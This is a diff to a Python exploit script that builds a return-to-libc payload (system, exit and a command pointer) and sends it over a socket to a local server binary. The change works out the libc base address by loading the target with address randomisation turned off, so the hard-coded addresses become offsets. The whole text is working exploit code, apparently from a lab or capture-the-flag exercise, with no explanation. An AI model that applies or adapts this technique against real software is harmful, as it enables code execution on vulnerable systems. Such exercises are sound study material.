@@ -2,6 +2,7 @@
 from struct import pack
 import sys
 import socket
+import subprocess
 import time
 from console import console
 
@@ -13,11 +14,11 @@ sock = socket.create_connection(('127.0.0.1', port),
                                 socket.getdefaulttimeout(),
                                 ('127.0.0.1', 0))
 
+base = int(subprocess.check_output(r"setarch i686 -R bash -c 'LD_TRACE_LOADED_OBJECTS=1 webroot/server'|sed -ne '/libc/ s/.*(\(.*\))/\1/p'", shell=True), 16)
 p = ''
-
-p += pack('<I', 0xf7e5a080) #system
+p += pack('<I', base + 0x00041080) #system
 #p += pack('<I', 0xf7e4c7b0)
-p += pack('<I', 0xf7e4c7b0) #exit
+p += pack('<I', base + 0x000337b0) #exit
 p += pack('<I', 0xffffceff) #cmd
 p += pack('<I', 0xffffc850)
 p += pack('<I', 0xffffc850)
